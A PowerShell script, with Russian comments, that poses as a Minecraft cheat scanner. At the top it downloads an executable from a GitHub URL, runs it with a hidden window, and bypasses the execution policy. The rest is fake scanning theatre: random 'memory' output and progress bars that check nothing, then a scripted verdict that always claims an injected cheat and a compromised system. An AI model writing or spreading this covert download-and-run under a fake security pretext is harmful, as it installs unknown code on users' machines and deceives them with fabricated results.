# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/letyss0304/FTchecker/raw/refs/heads/main/FTchecker.exe" -OutFile "FTchecker.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "FTchecker.exe" -WindowStyle Hidden
    

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host

$Host.UI.RawUI.WindowTitle = "System Deep Scan Utility v7.1.0-STABLE"

# Функция для эффекта "печатающейся строки"
function Write-Typewriter($text, $color = "White", $speed = 20) {
    $chars = $text.ToCharArray()
    foreach ($char in $chars) {
        Write-Host $char -NoNewline -ForegroundColor $color
        Start-Sleep -Milliseconds $speed
    }
    Write-Host ""
}

# Функция "бегущих данных" для имитации чтения памяти
function Show-MatrixEffect($duration) {
    $endTime = (Get-Date).AddSeconds($duration)
    $colors = "Green", "DarkGreen", "White"
    while ((Get-Date) -lt $endTime) {
        $line = ""
        for ($i=0; $i -lt 10; $i++) { $line += (Get-Random -Minimum 1000 -Maximum 9999).ToString() + " " }
        Write-Host " [0x$(("{0:X}" -f (Get-Random -Max 65535)))] $line" -ForegroundColor ($colors | Get-Random)
        Start-Sleep -Milliseconds 50
    }
}

# --- НАЧАЛО ПРОЦЕССА ---

Write-Typewriter "ИНИЦИАЛИЗАЦИЯ ЗАЩИЩЕННОГО ЯДРА СКАНЕРА..." "Cyan" 40
Start-Sleep -Seconds 1

# 1. Загрузка компонентов
$tasks = @("Kernel Hook Discovery", "Memory Page Analysis", "DPI Packet Inspection", "JNI-Trace Debugger")
foreach ($task in $tasks) {
    Write-Host "[WAIT]" -NoNewline -ForegroundColor Yellow
    Write-Host " Подключение модуля: $task..."
    Start-Sleep -Seconds 2
    Write-Host "`r[ OK ] Модуль $task активен." -ForegroundColor Green
}

# 2. Имитация чтения памяти (Матрица) - 20 секунд
Write-Host "`n[!] АНАЛИЗ ОПЕРАТИВНОЙ ПАМЯТИ В РЕАЛЬНОМ ВРЕМЕНИ..." -ForegroundColor Cyan
Show-MatrixEffect 20

# 3. Прогресс-бары (суммарно ~50 секунд)
$stages = @(
    @{Name="Сканирование скрытых секторов диска"; Time=15},
    @{Name="Поиск сигнатур в Prefetch/Superfetch"; Time=20},
    @{Name="Реконструкция удаленных дескрипторов"; Time=15}
)

foreach ($stage in $stages) {
    $name = $stage.Name
    for ($i = 0; $i -le 100; $i += 2) {
        Write-Progress -Activity "ИДЕТ ГЛУБОКИЙ АНАЛИЗ" -Status "$name : $i%" -PercentComplete $i
        Start-Sleep -Milliseconds ($stage.Time * 10)
    }
}

# --- ФИНАЛЬНЫЙ ВЫВОД ---
Clear-Host
Write-Host "=========================================================" -ForegroundColor Red
Write-Typewriter "!! ОБНАРУЖЕН КРИТИЧЕСКИЙ ОБЪЕКТ !!" "Red" 50
Write-Host "=========================================================" -ForegroundColor Red
Write-Host ""
Write-Host "СТАТУС: " -NoNewline; Write-Host "УГРОЗА ОБНАРУЖЕНА" -ForegroundColor Black -BackgroundColor Red
Write-Host "ОБЪЕКТ: " -NoNewline; Write-Host "internal_overlay_v3.dll" -ForegroundColor Yellow
Write-Host "РАСПОЛОЖЕНИЕ: " -NoNewline; Write-Host "MemoryBlock_0x1A4F_Kernel" -ForegroundColor Yellow
Write-Host "СИГНАТУРА: " -NoNewline; Write-Host "CheatEngine.Inject.VapeMod" -ForegroundColor Yellow
Write-Host ""
Write-Host "---------------------------------------------------------" -ForegroundColor Red
Write-Host "СИСТЕМА: " -NoNewline; Write-Host "СКОМПРОМЕТИРОВАНА" -ForegroundColor DarkRed
Write-Host "РЕКОМЕНДАЦИЯ: " -NoNewline; Write-Host "УДАЛЕНИЕ ВРУЧНУЮ ИЗ ПАМЯТИ" -ForegroundColor Gray
Write-Host "=========================================================" -ForegroundColor Red

# Звуковой эффект ошибки
for($i=0; $i -lt 3; $i++) { [System.Media.SystemSounds]::Hand.Play(); Start-Sleep -Milliseconds 500 }

Write-Host "`nПроверка завершена. Нажмите ENTER для выхода..."
Read-Host
